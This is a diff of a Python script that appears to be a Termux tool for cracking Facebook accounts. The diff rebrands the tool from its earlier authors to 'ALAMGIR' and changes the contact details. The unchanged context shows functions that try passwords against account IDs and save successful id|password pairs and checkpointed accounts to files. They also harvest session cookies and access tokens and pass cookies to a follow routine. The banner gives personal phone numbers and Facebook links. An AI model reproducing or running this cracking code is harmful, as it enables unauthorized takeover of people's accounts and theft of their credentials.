@@ -166,7 +166,7 @@ ahsan="ALE-"
 
 imt="-M4786=="
 
-ak="AHSAN-"
+md="ALAMGIR-"
 
 myid=uuid.uuid4().hex[:10].upper()
 
@@ -606,7 +606,7 @@ def crack(idf,pwv):
 
 	fff = '%'
 
-	sys.stdout.write('\r %s[ UZAIR ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ ALAMGIR ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 
 	sys.stdout.flush()
 
@@ -636,7 +636,7 @@ def crack(idf,pwv):
 
 				cp +=1
 
-				print( f'\r\x1b[1;91m [ UZAIR-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ ALAMGIR-CP ] {idf} | {pw}')
 
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 
@@ -650,7 +650,7 @@ def crack(idf,pwv):
 
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-				print(f'\r\x1b[1;92m [ UZAIR-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ ALAMGIR-OK ] {idf} | {pw}')
 
 				wrt =('%s - %s' % (idf,pw))
 
@@ -682,7 +682,7 @@ def free(idf,pwv):
 
 	fff = '%'
 
-	sys.stdout.write('\r %s[ TALHA ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ ALAMGIR ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 
 	sys.stdout.flush()
 
@@ -710,7 +710,7 @@ def free(idf,pwv):
 
 			if "checkpoint" in po.cookies.get_dict().keys():
 
-				rint( f'\r\x1b[1;91m [ UZAIR-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ ALAMGIR-CP ] {idf} | {pw}')
 
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 
@@ -724,13 +724,13 @@ def free(idf,pwv):
 
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-				print(f'\r\x1b[1;92m [ UZAIR-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ ALAMGIR-OK ] {idf} | {pw}')
 
 				wrt =('%s - %s' % (idf,pw))
 
 				ok.append(wrt)
 
-				open('/sdcard/UZAIR-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/ALAMGIR-OK.txt','a').write('%s\n' % wrt)
 
 				follow(ses,coki)
 
@@ -760,31 +760,24 @@ logo = ("""\033[1;32m
 
        
 
-╔══╗╔══╗╔╗─╔╗╔╗╔══╗
-
-╚╗╔╝║╔╗║║║─║╚╝║║╔╗║
-
-─║║─║╠╣║║╚╗║╔╗║║╠╣║
-
-─╚╝─╚╝╚╝╚═╝╚╝╚╝╚╝╚╝
-
-───────────────────   \033
-
+┌───────────────────────────────────────────────────────────┐
+│                                                           │
+│   █████╗ ██╗      █████╗ ███╗   ███╗ ██████╗ ██╗██████╗   │
+│  ██╔══██╗██║     ██╔══██╗████╗ ████║██╔════╝ ██║██╔══██╗  │
+│  ███████║██║     ███████║██╔████╔██║██║  ███╗██║██████╔╝  │
+│  ██╔══██║██║     ██╔══██║██║╚██╔╝██║██║   ██║██║██╔══██╗  │
+│  ██║  ██║███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██║██║  ██║  │
+│  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝╚═╝  ╚═╝  │
+│                                            │
+└───────────────────────────────────────────────────────────┘  \033
 __________________×______________________
-
   
-
-  Tools Created  :  ABU TALHA ISLAM
-
+  Auther   :  MD ALAMGIR HOSEN
  
-
-  Github   :  https://github.com/TermuxTalha
-
-  Facebook : https://www.facebook.com/Talhahelpchenter21
-
+  Github   :  THE DARK WORLD TEAM-CYBER ARMY&RECOVERY ZONE 
+  Facebook : https://www.facebook.com/TeraPaPa.ALAMgir.HoSeN ⭐⭐⭐⭐
   
-
-  Contact : 01304002896
+  Contact : Whatsapp+8801712034653
 
 __________________×______________________\033[1;37m""")
 
@@ -1670,23 +1663,23 @@ class Main:
 
 			if "session_key" in response.text and "EAAA" in response.text:
 
-				print("\r \033[0;92m[ Talha-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ ALAMGIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
 
 				print ("\r \033[0;92m Congrats Bro ")
 
 				self.ok.append("%s|%s"%(uid, pw))
 
-				open("2009-Talha-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-ALAMGIR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 
 				break
 
 			elif "www.facebook.com" in response.json()["error_msg"]:
 
-				print("\r \033[0;92m[ UZAIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ ALAMGIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
 
 				self.cp.append("%s|%s"%(uid, pw))
 
-				open("2009-Talha-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-ALAMGIR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 
 				break
 
@@ -2484,7 +2477,7 @@ class Main:
 
 		sys.stdout.write(
 
-			"\r [TALHA ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ALAMGIR ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 
 		); sys.stdout.flush()
 
@@ -2518,23 +2511,23 @@ class Main:
 
 			if "session_key" in response.text and "EAAA" in response.text:
 
-				print("\r \033[0;92m[ TALHA-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ ALAMGIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
 
 				print ("\r \033[0;92m Congrats Bro ")
 
 				self.ok.append("%s|%s"%(uid, pw))
 
-				open("2009-TALHA-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-ALAMGIR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 
 				break
 
 			elif "www.facebook.com" in response.json()["error_msg"]:
 
-				print("\r \033[0;92m[ TALHA-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ ALAMGIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
 
 				self.cp.append("%s|%s"%(uid, pw))
 
-				open("2009-TALHA-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-ALAMGIR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 
 				break
 
@@ -2592,7 +2585,7 @@ def Subscraption():
 
 		print ("")
 
-		print (" Your Key : "+ak+ahsan+key1)
+		print (" Your Key : "+alam+priya+key1)
 
 		print ("")
 
@@ -2604,9 +2597,9 @@ def Subscraption():
 
 		time.sleep(3.5)
 
-		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
+		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+alam+priya+''+key1
 
-		os.system('am start https://wa.me/+923407275127?text=' + tks)
+		os.system('am start https://wa.me/+8801712034653?text=' + tks)
 
 		Subscraption()        
 
